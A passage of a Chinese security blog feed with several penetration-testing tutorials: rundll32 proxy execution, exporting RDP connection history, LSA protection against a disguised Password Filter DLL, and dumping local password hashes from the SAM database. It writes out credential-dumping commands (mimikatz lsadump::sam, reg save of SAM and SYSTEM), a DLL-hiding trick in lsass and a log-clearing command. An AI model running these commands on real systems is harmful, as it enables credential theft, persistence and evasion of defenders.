C:\4\calc.hta</code></pre><p>执行后弹出计算器</p><p>例如url文件，内容如下：</p><pre><code>[InternetShortcut]URL=c:\windows\system32\calc.exe</code></pre><p>cmd:</p><pre><code>rundll32.exe ieframe.dll,OpenURL C:\4\calc.url</code></pre><p>成功执行，弹出计算器</p><h3 id="4、更多利用方法"><a href="#4、更多利用方法" class="headerlink" title="4、更多利用方法"></a>4、更多利用方法</h3><p>hexacorn在他的<a href="http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/" target="_blank" rel="noopener">文章</a>里分享了另一个可供使用的dll和导出函数：</p><pre><code>rundll32 zipfldr.dll, RouteTheCall calc.exe</code></pre><p>当然，还有更多可供使用的dll，本文暂不介绍</p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><hr><p>本文分析了利用rundll32.exe加载url.dll并通过导出函数OpenURL执行程序的细节，对其扩展，尝试利用脚本批量扫描<code>%windir%/system32</code>下的dll，找到能够执行程序的dll，分别验证了bohops和Hexacorn的结论。</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>渗透技巧——获得Windows系统的远程桌面连接历史记录</title>
    <link href="wiki.cfyqy.com/posts/792fd457.html"/>
    <id>wiki.cfyqy.com/posts/792fd457.html</id>
    <published>2018-05-25T13:03:44.913Z</published>
    <updated>2018-05-25T13:04:28.158Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>在渗透测试中，远程桌面连接的历史记录不可忽视，根据历史记录往往能定位出关键的服务器。</p><p>前几天有一篇文章介绍了如何清除记录，那么这篇文章就来介绍一下如何导出历史记录。</p><p>清除记录的文章地址如下：</p><p><a href="http://woshub.com/how-to-clear-rdp-connections-history/#h2_3" target="_blank" rel="noopener">http://woshub.com/how-to-clear-rdp-connections-history/#h2_3</a></p><p>最开始的设想是通过枚举注册表就能够完成，但深入研究发现，想要获得所有用户的历史记录，需要逐个获得用户的NTUSER.DAT文件，通过注册表加载配置单元，导入用户配置信息，再进行枚举才能够实现。</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>获得历史记录的思路</li><li>导出登录用户的历史记录</li><li>导出所有用户的历史记录</li><li>两种方法的实现思路和脚本编写细节</li></ul><h2 id="0x02-获得远程桌面连接历史记录的思路"><a href="#0x02-获得远程桌面连接历史记录的思路" class="headerlink" title="0x02 获得远程桌面连接历史记录的思路"></a>0x02 获得远程桌面连接历史记录的思路</h2><hr><h3 id="1、获得当前用户的历史记录："><a href="#1、获得当前用户的历史记录：" class="headerlink" title="1、获得当前用户的历史记录："></a>1、获得当前用户的历史记录：</h3><p>枚举注册表键值<code>HKCU:\Software\Microsoft\Terminal Server Client\Servers</code></p><p>每个注册表项保存连接的服务器地址，其中的键值<code>UsernameHint</code>对应登录用户名</p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-15/2-1.png" alt="Alt text"></p><h3 id="2、获得已登录用户的历史记录："><a href="#2、获得已登录用户的历史记录：" class="headerlink" title="2、获得已登录用户的历史记录："></a>2、获得已登录用户的历史记录：</h3><p>已登录用户的注册表信息会同步保存在<code>HKEY_USERS\SID</code>下，SID要对应每个用户的SID</p><p>当前系统登录两个用户，分别有两个子项，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-15/2-2.png" alt="Alt text"></p><p><strong>注：</strong></p><p>HKEY_USERS仅包含了缺省用户设置和登录用户的信息，在用户未登录时用户的设置是不可用的</p><p>也就是说，如果当前登录了两个用户，那么这两个用户的注册表信息都会保存在<code>HKEY_USERS\SID</code>下，如果第三个用户未登录，无法直接获得该用户的注册表信息，也就无法导出该用户的远程桌面连接历史记录</p><p>所以，通过枚举注册表键值<code>HKEY_USERS\SID\Software\Microsoft\Terminal Server Client\Servers</code>能够获得已登录用户的远程桌面连接历史记录</p><h3 id="3、获得所有用户的历史记录："><a href="#3、获得所有用户的历史记录：" class="headerlink" title="3、获得所有用户的历史记录："></a>3、获得所有用户的历史记录：</h3><p>对于未登录用户，无法直接获得注册表配置信息，这里可以通过加载配置单元的方式来解决</p><p>选中HKEY_USERS项，<code>文件</code>-<code>加载配置单元</code>，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-15/2-3.png" alt="Alt text"></p><p>打开用户的NTUSER.DAT文件，路径为<code>C:\Documents and Settings\用户名\NTUSER.DAT</code></p><p>接着指定一个项名称，即可在HKEY_USERS下读取该用户的注册表配置信息，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-15/2-4.png" alt="Alt text"></p><p><strong>注：</strong></p><p>删除该项需要通过卸载配置单元来清除</p><p>所以，想要获得所有用户的远程桌面连接历史记录，首先需要枚举注册表键值<code>HKEY_USERS\SID\</code>，对于未登录用户，需要加载对应的NTUSER.DAT文件，再次枚举获得完整记录，最后卸载对应的注册表项</p><p><strong>补充：</strong></p><p>通过命令行实现加载配置单元的实例：</p><pre><code>Reg load HKEY_USERS\S-1-5-21-1170783345-3748964848-1387080272-1003 C:\Documents and Settings\c\NTUSER.DAT</code></pre><p>通过命令行实现卸载配置单元的实例：</p><pre><code>Reg unload HKEY_USERS\S-1-5-21-1170783345-3748964848-1387080272-1003</code></pre><h2 id="0x03-powershell实现细节"><a href="#0x03-powershell实现细节" class="headerlink" title="0x03 powershell实现细节"></a>0x03 powershell实现细节</h2><hr><h3 id="1、获得当前用户的历史记录"><a href="#1、获得当前用户的历史记录" class="headerlink" title="1、获得当前用户的历史记录"></a>1、获得当前用户的历史记录</h3><p>位置:<code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code></p><p>枚举指定注册表项下的子项:</p><pre><code>dir &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; -Name</code></pre><p>查询指定注册表项的注册表键值:</p><pre><code>(Get-ItemProperty -Path &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\192.168.62.137&quot;).UsernameHint</code></pre><p>加入foreach循环实现枚举:</p><pre><code>$RegPath = &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\&quot;$QueryPath = dir $RegPath -Nameforeach($Name in $QueryPath){    (Get-ItemProperty -Path $RegPath$Name).UsernameHint}</code></pre><p>加入捕获异常，不输出错误信息，如果查不到注册表键值，返回无法获得</p><p>完整脚本:</p><pre><code>$RegPath = &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\&quot;$QueryPath = dir $RegPath -Nameforeach($Name in $QueryPath){       Try      {          $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop | Out-Null).UsernameHint            Write-Host &quot;Server:&quot;$Name            Write-Host &quot;User:&quot;$User&quot;`n&quot;        }        Catch          {        Write-Host &quot;No RDP Connections History&quot;        }}</code></pre><h3 id="2、获得已登录用户的历史记录"><a href="#2、获得已登录用户的历史记录" class="headerlink" title="2、获得已登录用户的历史记录"></a>2、获得已登录用户的历史记录</h3><p>位置:<code>HKEY_USERS\SID\Software\Microsoft\Terminal Server Client\Servers</code></p><p><strong>注:</strong></p><p>SID对应每个用户的sid</p><p>首先需要枚举所有用户sid</p><p>powershell:</p><pre><code>Get-WmiObject -Class Win32_UserAccount</code></pre><p>wmi:</p><pre><code>wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_UserAccount GET /all  /FORMAT:list</code></pre><p>枚举用户名及其对应的SID:</p><pre><code>$AllUser = Get-WmiObject -Class Win32_UserAccountforeach($User in $AllUser){    Write-Host $User.Name&quot;:&quot;$User.SID}</code></pre><p>将以上脚本结合，先枚举用户的SID，查询对应HKEY_USERS下的注册表项，再次枚举注册表键值项，获得完整结果:</p><p>(需要管理员权限)</p><pre><code>$AllUser = Get-WmiObject -Class Win32_UserAccountforeach($User in $AllUser){    $RegPath = &quot;Registry::HKEY_USERS\&quot;+$User.SID+&quot;\Software\Microsoft\Terminal Server Client\Servers\&quot;    Write-Host &quot;User:&quot;$User.Name    Write-Host &quot;SID:&quot;$User.SID    Write-Host &quot;Status:&quot;$User.Status    Try          {         $QueryPath = dir $RegPath -Name -ErrorAction Stop    }    Catch    {        Write-Host &quot;No RDP Connections History&quot;        Write-Host &quot;----------------------------------&quot;        continue    }    foreach($Name in $QueryPath)    {           Try              {                  $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint                Write-Host &quot;Server:&quot;$Name                Write-Host &quot;User:&quot;$User            }            Catch              {            Write-Host &quot;No RDP Connections History&quot;            }    }    Write-Host &quot;----------------------------------&quot;    }</code></pre><p><strong>注：</strong></p><p>$User.Status表示帐户状态，通过<code>Get-WmiObject -Class Win32_UserAccount</code>无法直接查询到，可通过wmi命令获取：<br><code>wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_UserAccount GET /all  /FORMAT:list</code></p><h3 id="3、获得所有用户的历史记录"><a href="#3、获得所有用户的历史记录" class="headerlink" title="3、获得所有用户的历史记录"></a>3、获得所有用户的历史记录</h3><p>加载配置单元的文件位置：</p><pre><code>&quot;C:\Documents and Settings\用户名\NTUSER.DAT&quot;</code></pre><h4 id="实现思路："><a href="#实现思路：" class="headerlink" title="实现思路："></a>实现思路：</h4><ol><li>获得每个用户对应的SID，拼接对应的注册表键值”Registry::HKEY_USERS\”+$User.SID+”\Software\Microsoft\Terminal Server Client\Servers\”</li><li>如果读取失败，代表此用户未登录，接着尝试加载配置单元</li><li>拼接配置单元文件位置”C:\Documents and Settings\”+$User.Name+”\NTUSER.DAT”</li><li>配置单元对应的注册表项以该用户的sid命名</li><li>枚举注册表获得历史记录</li><li>卸载注册表项</li></ol><p><strong>注：</strong></p><p>需要新启动一个进程来卸载配置单元，否则提示失败</p><p>为了避免使用多个try catch捕获异常，代码结构作了改变，使用If Else作判断，完整实现代码可参考：</p><p><a href="https://github.com/3gstudent/List-RDP-Connections-History" target="_blank" rel="noopener">https://github.com/3gstudent/List-RDP-Connections-History</a></p><p>测试结果如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-15/3-1.png" alt="Alt text"></p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><hr><p>本文介绍了如何通过powershell获得Windows系统的远程桌面连接历史记录，需要注意的是无法直接获得未登录用户的注册表配置信息(可以加载配置单元解决)。根据远程桌面连接历史记录，往往能定位出关键的服务器。</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>配置Additional LSA Protection监控Password Filter DLL</title>
    <link href="wiki.cfyqy.com/posts/9f5e4b60.html"/>
    <id>wiki.cfyqy.com/posts/9f5e4b60.html</id>
    <published>2018-05-25T13:03:44.911Z</published>
    <updated>2018-05-25T13:04:28.157Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>针对文章<a href="https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" target="_blank" rel="noopener">《Password Filter DLL在渗透测试中的应用》</a>中wyzzoo的回复,提醒注意高版本系统上考虑的问题,地址如下:</p><p><a href="https://github.com/3gstudent/feedback/issues/13#issuecomment-371694931" target="_blank" rel="noopener">https://github.com/3gstudent/feedback/issues/13#issuecomment-371694931</a></p><p>于是我对这部分内容进行研究,整理成文</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容:</p><ul><li>如何配置额外的LSA保护</li><li>如何获得监控结果</li><li>补充一个Password Filter DLL的利用思路</li><li>利用Additional LSA Protection的检测效果</li></ul><h2 id="0x02-配置额外的LSA保护"><a href="#0x02-配置额外的LSA保护" class="headerlink" title="0x02 配置额外的LSA保护"></a>0x02 配置额外的LSA保护</h2><hr><p>参考官方文档:</p><p><a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection</a></p><p>Windows8.1系统开始,为LSA提供了额外的保护,以防止由未受保护的进程读取内存和代码注入</p><h3 id="保护方法"><a href="#保护方法" class="headerlink" title="保护方法:"></a>保护方法:</h3><p>要求加载到LSA的任何插件都使用Microsoft签名进行数字签名</p><p>具体的说,数字签名指的是catalog签名，签名需要满足WHQL认证</p><p>参考资料：</p><p><a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/whql-release-signature" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/whql-release-signature</a></p><p>关于catalog签名有过文章介绍:<a href="https://3gstudent.github.io/3gstudent.github.io/CAT%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">《CAT文件数字签名使用技巧》</a></p><p>测试系统： Win8.1 x64</p><h3 id="配置方法"><a href="#配置方法" class="headerlink" title="配置方法:"></a>配置方法:</h3><h4 id="1、操作系统需要满足条件"><a href="#1、操作系统需要满足条件" class="headerlink" title="1、操作系统需要满足条件:"></a>1、操作系统需要满足条件:</h4><p>Win8.1或者更新的系统</p><h4 id="2、修改注册表"><a href="#2、修改注册表" class="headerlink" title="2、修改注册表"></a>2、修改注册表</h4><p>注册表位置<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe</code>，新建DWORD项<code>AuditLevel</code>，值为<code>00000008</code></p><p>对应cmd命令如下：</p><pre><code>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe&quot; /v &quot;AuditLevel&quot; /t REG_DWORD /d &quot;00000008&quot; /f</code></pre><h4 id="3、重启系统"><a href="#3、重启系统" class="headerlink" title="3、重启系统"></a>3、重启系统</h4><h2 id="0x03-获得监控结果"><a href="#0x03-获得监控结果" class="headerlink" title="0x03 获得监控结果"></a>0x03 获得监控结果</h2><hr><p>查看日志Event 3065和Event 3066</p><p>Event 3065：此事件记录代码完整性检查确定进程（通常是lsass.exe）试图加载不符合共享段的安全要求的特定驱动程序。但是，由于设置了系统策略，图像被允许加载。</p><p>Event 3066：此事件记录代码完整性检查确定进程（通常是lsass.exe）试图加载不符合Microsoft签名级别要求的特定驱动程序。但是，由于设置了系统策略，图像被允许加载。</p><p>位置：<code>Applications and Services Logs\Microsoft\Windows\CodeIntegrity</code></p><p>能够记录不符合条件的dll，但并未阻止加载dll，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-12/2-1.png" alt="Alt text"></p><p>通过命令行查询日志Event 3065和Event 3066：</p><p>获取日志分类列表：</p><pre><code>wevtutil el &gt;1.txt</code></pre><p>找到<code>CodeIntegrity</code>对应的为<code>Microsoft-Windows-CodeIntegrity/Operational</code></p><p>查找Event 3065和Event 3066：</p><pre><code>wevtutil qe Microsoft-Windows-CodeIntegrity/Operational /rd:true /f:text /q:&quot;*[system/eventid=3065 and 3066]&quot;</code></pre><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-12/2-2.png" alt="Alt text"></p><p><strong>补充：</strong></p><p>删除日志CodeIntegrity：</p><pre><code>wevtutil cl &quot;Microsoft-Windows-CodeIntegrity/Operational&quot;</code></pre><h2 id="0x04-补充一个Password-Filter-DLL的利用思路——利用Long-UNC文件名欺骗实现DLL的“隐藏”"><a href="#0x04-补充一个Password-Filter-DLL的利用思路——利用Long-UNC文件名欺骗实现DLL的“隐藏”" class="headerlink" title="0x04 补充一个Password Filter DLL的利用思路——利用Long UNC文件名欺骗实现DLL的“隐藏”"></a>0x04 补充一个Password Filter DLL的利用思路——利用Long UNC文件名欺骗实现DLL的“隐藏”</h2><hr><p>具体隐藏细节可参考文章<a href="https://3gstudent.github.io/3gstudent.github.io/Catalog%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-Long-UNC%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97/" target="_blank" rel="noopener">《Catalog签名伪造——Long UNC文件名欺骗》</a></p><h3 id="1、将dll命名为Long-UNC文件名格式，保存在-windir-system32-下"><a href="#1、将dll命名为Long-UNC文件名格式，保存在-windir-system32-下" class="headerlink" title="1、将dll命名为Long UNC文件名格式，保存在%windir%\system32\下"></a>1、将dll命名为Long UNC文件名格式，保存在<code>%windir%\system32\</code>下</h3><p>lsass.exe进程默认加载scecli.dll，所以选择将dll伪装成scecli.dll</p><p>命令行：</p><pre><code>type Win32Project3.dll &gt; &quot;\\?\C:\windows\system32\scecli.dll &quot;</code></pre><p><strong>注：</strong></p><p>scecli.dll名称后面有一个空格</p><h3 id="2、获得该dll的短文件名"><a href="#2、获得该dll的短文件名" class="headerlink" title="2、获得该dll的短文件名"></a>2、获得该dll的短文件名</h3><p>命令行：</p><pre><code>dir /x scecli*.dll</code></pre><p>获得短文件名<code>SCECLI~1.DLL</code>，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-12/3-1.png" alt="Alt text"></p><h3 id="3、修改注册表键值"><a href="#3、修改注册表键值" class="headerlink" title="3、修改注册表键值"></a>3、修改注册表键值</h3><p>读取键值：</p><pre><code>REG QUERY &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;Notification Packages&quot;</code></pre><p>添加dll：</p><pre><code>REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;Notification Packages&quot; /t REG_MULTI_SZ /d &quot;scecli\0SCECLI~1.DLL&quot; /f</code></pre><h3 id="4、重启"><a href="#4、重启" class="headerlink" title="4、重启"></a>4、重启</h3><p>使用Process Explorer查看lsass进程加载的dll</p><p>显示加载两个同样的scecli.dll，具体属性存在差别，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-12/3-2.png" alt="Alt text"></p><h3 id="5、检测"><a href="#5、检测" class="headerlink" title="5、检测"></a>5、检测</h3><p>Event 3066成功检测，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-12/3-3.png" alt="Alt text"></p><h2 id="0x05-补充"><a href="#0x05-补充" class="headerlink" title="0x05 补充"></a>0x05 补充</h2><hr><p>1、为Password Filter DLL添加一个伪造的微软Authenticode签名，并且修改证书验证机制使其生效，仍无法绕过Additional LSA Protection的监控，因为Password Filter DLL需要合法的catalog签名，而不是Authenticode签名</p><p>2、自己为Password Filter DLL制作一个catalog签名并将其添加到系统的安全编录数据库中，仍无法绕过Additional LSA Protection的监控</p><h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><hr><p>本文介绍了配置Additional LSA Protection监控Password Filter DLL的方法和检测效果，如果Password Filter DLL未获得合法的catalog签名，系统能绕成功检测，但默认不会阻止加载</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>渗透技巧——通过SAM数据库获得本地用户hash</title>
    <link href="wiki.cfyqy.com/posts/a446655f.html"/>
    <id>wiki.cfyqy.com/posts/a446655f.html</id>
    <published>2018-05-25T13:03:44.909Z</published>
    <updated>2018-05-25T13:04:28.157Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>在渗透测试中，获得了Windows系统的访问权限后，通常会使用mimikatz的<code>sekurlsa::logonpasswords</code>命令尝试读取进程lsass的信息来获取当前登录用户的密码信息，但想要全面获取系统中的密码信息，还要对SAM数据库中保存的信息进行提取，导出当前系统中所有本地用户的hash。</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>通过SAM数据库获得用户hash的多种方法</li><li>原理分析</li></ul><h2 id="0x02-通过SAM数据库获得用户hash的方法"><a href="#0x02-通过SAM数据库获得用户hash的方法" class="headerlink" title="0x02 通过SAM数据库获得用户hash的方法"></a>0x02 通过SAM数据库获得用户hash的方法</h2><hr><h3 id="1、在线读取SAM数据库"><a href="#1、在线读取SAM数据库" class="headerlink" title="1、在线读取SAM数据库"></a>1、在线读取SAM数据库</h3><p>读取当前系统的SAM数据库文件，获得系统所有本地用户的hash</p><h4 id="1-mimikatz"><a href="#1-mimikatz" class="headerlink" title="(1) mimikatz"></a>(1) mimikatz</h4><pre><code>privilege::debugtoken::elevatelsadump::sam</code></pre><p>测试如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/2-1.png" alt="Alt text"></p><h4 id="2-pwdump7"><a href="#2-pwdump7" class="headerlink" title="(2) pwdump7"></a>(2) pwdump7</h4><p>下载地址：</p><p><a href="http://passwords.openwall.net/b/pwdump/pwdump7.zip" target="_blank" rel="noopener">http://passwords.openwall.net/b/pwdump/pwdump7.zip</a></p><p>管理员权限执行，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/2-2.png" alt="Alt text"></p><h4 id="3-powershell"><a href="#3-powershell" class="headerlink" title="(3) powershell"></a>(3) powershell</h4><p>下载地址：</p><p><a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1</a></p><p>管理员权限执行，测试如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/2-3.png" alt="Alt text"></p><h3 id="2、离线读取SAM数据库"><a href="#2、离线读取SAM数据库" class="headerlink" title="2、离线读取SAM数据库"></a>2、离线读取SAM数据库</h3><p>获取当前系统的SAM数据库文件，在另一系统下进行读取</p><p>导出SAM数据库文件有以下两种实现方法：</p><h4 id="1-保存注册表"><a href="#1-保存注册表" class="headerlink" title="(1) 保存注册表"></a>(1) 保存注册表</h4><p>管理员权限</p><pre><code>reg save HKLM\SYSTEM SystemBkup.hivreg save HKLM\SAM SamBkup.hiv</code></pre><h4 id="2-复制文件"><a href="#2-复制文件" class="headerlink" title="(2) 复制文件"></a>(2) 复制文件</h4><pre><code>C:\Windows\System32\config\SYSTEMC:\Windows\System32\config\SAM</code></pre><p>默认无法被复制，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/2-4.png" alt="Alt text"></p><p>需要借助NinjaCopy，作者Joe Bialek，参考下载地址：</p><p><a href="https://github.com/3gstudent/NinjaCopy" target="_blank" rel="noopener">https://github.com/3gstudent/NinjaCopy</a></p><p>导出SAM数据库文件后，在另一系统，可通过以下方式导出用户hash：</p><h4 id="1-mimikatz-1"><a href="#1-mimikatz-1" class="headerlink" title="(1) mimikatz"></a>(1) mimikatz</h4><pre><code>lsadump::sam /sam:SamBkup.hiv /system:SystemBkup.hiv</code></pre><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-1.png" alt="Alt text"></p><p><strong>注：</strong></p><p>mimikatz的官方说明有问题，地址如下：</p><p><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump</a></p><p>导出命令：</p><pre><code>lsadump::sam SystemBkup.hiv SamBkup.hiv</code></pre><p>会报错，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-2.png" alt="Alt text"></p><p>可用的命令由@我爱这个世界提供</p><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><p>以下工具在读取Win7系统的SAM数据库文件会报错</p><h4 id="1-Pwdump7"><a href="#1-Pwdump7" class="headerlink" title="(1) Pwdump7"></a>(1) Pwdump7</h4><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-3.png" alt="Alt text"></p><h4 id="2-Pwdump5"><a href="#2-Pwdump5" class="headerlink" title="(2) Pwdump5"></a>(2) Pwdump5</h4><p>下载地址：</p><p><a href="http://passwords.openwall.net/b/pwdump/pwdump5.zip" target="_blank" rel="noopener">http://passwords.openwall.net/b/pwdump/pwdump5.zip</a></p><p>读取结果不正确，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-4.png" alt="Alt text"></p><h4 id="3-cain"><a href="#3-cain" class="headerlink" title="(3) cain"></a>(3) cain</h4><p>测试如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-5.png" alt="Alt text"></p><h2 id="0x03-原理分析"><a href="#0x03-原理分析" class="headerlink" title="0x03 原理分析"></a>0x03 原理分析</h2><hr><h3 id="1、读取HKLM-SYSTEM，获得syskey"><a href="#1、读取HKLM-SYSTEM，获得syskey" class="headerlink" title="1、读取HKLM\SYSTEM，获得syskey"></a>1、读取HKLM\SYSTEM，获得syskey</h3><p>读取注册表项<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>下的键值<code>JD</code>、<code>Skew1</code>、<code>GBG</code>和<code>Data</code>中的内容，拼接成syskey</p><p>代码可参考：</p><p><a href="https://github.com/johannwmeyer/quarkspwdump/blob/a68aa6330f37eb8d00055c73e6a4e3cb52bcdd6d/src/crypt.cpp#L222" target="_blank" rel="noopener">https://github.com/johannwmeyer/quarkspwdump/blob/a68aa6330f37eb8d00055c73e6a4e3cb52bcdd6d/src/crypt.cpp#L222</a></p><p><a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L219" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L219</a></p><p>完整计算代码可参考：</p><p><a href="https://raw.githubusercontent.com/3gstudent/Writeup/master/getsyskey.cpp" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/Writeup/master/getsyskey.cpp</a></p><p>(Steal from <a href="http://www.zcgonvh.com/post/ntds_dit_pwd_dumper.html" target="_blank" rel="noopener">http://www.zcgonvh.com/post/ntds_dit_pwd_dumper.html</a>)</p><h3 id="2、使用syskey解密HKLM-SAM"><a href="#2、使用syskey解密HKLM-SAM" class="headerlink" title="2、使用syskey解密HKLM\SAM"></a>2、使用syskey解密HKLM\SAM</h3><p>读取注册表项<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</code>下每个用户中F项和V项的内容，使用syskey进行一系列的解密</p><p>详细解密过程可参考如下链接：</p><p><a href="http://www.xfocus.net/articles/200306/550.html" target="_blank" rel="noopener">http://www.xfocus.net/articles/200306/550.html</a></p><p>综上，想要通过SAM数据库获得用户hash，需要获得两个文件：HKLM\SYSTEM和HKLM\SAM</p><p>最直接的导出方式是读取当前系统下的注册表HKLM\SYSTEM和HKLM\SAM，但需要获得system权限</p><p>从admin切换到system权限的方法可参考之前的文章：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/" target="_blank" rel="noopener">《渗透技巧——从Admin权限切换到System权限》</a></p><h2 id="0x04-小节"><a href="#0x04-小节" class="headerlink" title="0x04 小节"></a>0x04 小节</h2><hr><p>本文介绍了通过SAM数据库获得所有用户hash的多种方法，关键在于读取HKLM\SYSTEM和HKLM\SAM</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" 